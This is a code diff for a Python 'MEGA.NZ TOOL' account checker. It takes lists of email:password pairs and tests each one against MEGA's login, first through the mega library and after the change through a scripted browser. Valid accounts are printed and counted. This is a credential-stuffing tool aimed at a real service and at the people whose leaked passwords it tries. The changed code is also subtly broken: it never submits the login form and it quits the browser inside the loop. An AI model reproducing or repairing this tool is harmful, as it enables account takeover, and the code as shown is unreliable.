@@ -5,6 +5,7 @@ from mega import Mega
 from colorama import Fore, Style, init
 import traceback
 from datetime import datetime
+
 colorama.init(autoreset=True)
 
 ctypes.windll.kernel32.SetConsoleTitleW("MEGA.NZ TOOL | MADE BY VLC | VERSION 0.3")
@@ -89,12 +90,18 @@ def checker():
         for account in account:
             try:
                 acc = account.split(':')
-                mega.login(acc[0], acc[1])
-                print(f"{Fore.LIGHTGREEN_EX}[VALID] {account}")
-                output = open('validmega.txt', 'a', encoding='utf-8')
-                output.write(account + '\n')
-                output.close()
-                valid += 1
+                driver.get("https://mega.nz/login")
+                login_input = driver.find_element_by_name("email")
+                login_input.send_keys(acc[0])
+                password_input = driver.find_element_by_name("password")
+                password_input.send_keys(acc[1])
+                if "MY ACCOUNT" in driver.title:
+                   print(f"{Fore.LIGHTGREEN_EX}[VALID] {account}")
+                   valid += 1
+                else:
+                    print(f"{Fore.RED}[INVALID] {account}")
+                    invalid += 1
+                driver.quit()
             except:
                 print(f"{Fore.RED}[INVALID] {account}")
                 invalid += 1
